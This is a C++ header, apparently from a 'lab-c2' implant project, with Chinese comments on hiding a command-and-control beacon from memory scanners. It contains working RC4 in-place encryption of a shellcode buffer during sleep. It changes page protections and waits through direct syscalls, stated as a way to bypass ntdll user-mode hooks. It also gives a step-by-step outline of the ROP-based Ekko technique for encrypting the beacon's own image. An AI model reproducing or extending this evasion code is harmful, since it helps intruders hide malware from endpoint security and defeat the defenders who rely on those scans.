#pragma once
// lab-c2/implant/ekko.hpp
// 休眠混淆 (sleep mask): 让载荷在休眠窗口内以密文形式留在内存里
//
// 两种档位:
//   SleepMask  - 只加密"数据区"(尚未执行的 shellcode 缓冲)。安全, 直接可用。
//   Ekko 全量版 - 连信标自身镜像一起加密, 必须走 ROP 链, 见 README 末尾说明。
//
// 原理: 扫描器(内存 YARA / 页扫描)只在进程被挂起或休眠时效率最高。
//       把载荷页保护降到 RW 并 RC4 就地加密, 休眠结束后再解密回 RX,
//       密文窗口内任何特征串都匹配不到。

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "syscall.hpp"

namespace ekko {

// --------------------------------------------------------------- RC4 (与 tools/enc.py 一致)
inline void Rc4(BYTE* data, SIZE_T len, const BYTE* key, SIZE_T klen) {
    BYTE S[256];
    for (int i = 0; i < 256; ++i) S[i] = (BYTE)i;
    BYTE j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (BYTE)(j + S[i] + key[i % klen]);
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    BYTE i2 = 0; j = 0;
    for (SIZE_T n = 0; n < len; ++n) {
        i2 = (BYTE)(i2 + 1);
        j = (BYTE)(j + S[i2]);
        BYTE t = S[i2]; S[i2] = S[j]; S[j] = t;
        data[n] ^= S[(BYTE)(S[i2] + S[j])];
    }
}

// --------------------------------------------------------------- 数据区休眠混淆
// region 必须是"当前没有在执行的"内存(例如待注入的 shellcode 缓冲)。
// 页保护与等待都走系统调用, 不触发 ntdll 用户态钩子。
inline void SleepMask(BYTE* region, SIZE_T len, DWORD ms, const BYTE* key, SIZE_T klen) {
    PVOID base = region;
    SIZE_T sz = len;
    ULONG oldP = 0, tmp = 0;
    sc::Call("NtProtectVirtualMemory", (HANDLE)-1, &base, &sz, (ULONG)PAGE_READWRITE, &oldP);
    Rc4(region, len, key, klen);                       // 加密: 特征串此刻消失

    // 用等长事件等待代替 Sleep, 固定 Sleep 时长是常见行为特征
    HANDLE h = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (h) {
        LARGE_INTEGER t;
        t.QuadPart = -(LONGLONG)ms * 10000LL;          // 相对时间, 单位 100ns
        sc::Call("NtWaitForSingleObject", h, (BOOLEAN)FALSE, (PLARGE_INTEGER)&t);
        CloseHandle(h);
    }

    Rc4(region, len, key, klen);                       // 解密
    sc::Call("NtProtectVirtualMemory", (HANDLE)-1, &base, &sz, (ULONG)oldP, &tmp);
}

// --------------------------------------------------------------- Ekko 全量版骨架
// 要隐藏的是"正在执行的信标镜像", 因此加密期间执行的指令和栈上返回地址
// 都必须位于 ntdll。流程:
//
//   1. RtlCaptureContext(&ctx)                      捕获现场
//   2. 从 ctx.Rip 反查镜像基址 Base / SizeOfImage
//   3. 造一块 ROP 数组, 按执行顺序写入四个 ntdll 地址:
//        RtlCreateTimerQueue / RtlCreateTimer / NtWaitForSingleObject / NtContinue
//   4. 定时器回调里依次做: 改 RW -> RC4 加密 -> 等事件 -> RC4 解密 -> 改 RX
//   5. ctx.Rsp = ROP 数组, ctx.Rip = 数组首项, 然后 NtContinue(&ctx, FALSE)
//      -> 线程"跌进" ntdll, 加密窗口内自己的代码不在任何可执行页上
//   6. 定时器解密后 SetEvent, 线程从 ntdll 返回, 回到第 1 步之后继续跑
//
// 关键坑: 顺序必须是"先加密 -> 再跳 ntdll"。反过来会把返回地址也加密, 线程直接崩。
//         定时器回调只能用 ntdll 中的函数, 任何落在自己镜像里的回调都会执行密文。
inline void Ekko_Skeleton() {
    CONTEXT ctx{};
    RtlCaptureContext(&ctx);
    // 步骤 2: 从 ctx.Rip 向上(页对齐)扫 PE 头, 得到 Base 与 SizeOfImage
    // 步骤 3-6: 见上方说明; 建议先把上面的 SleepMask 跑通再切到这一档
}

} // namespace ekko
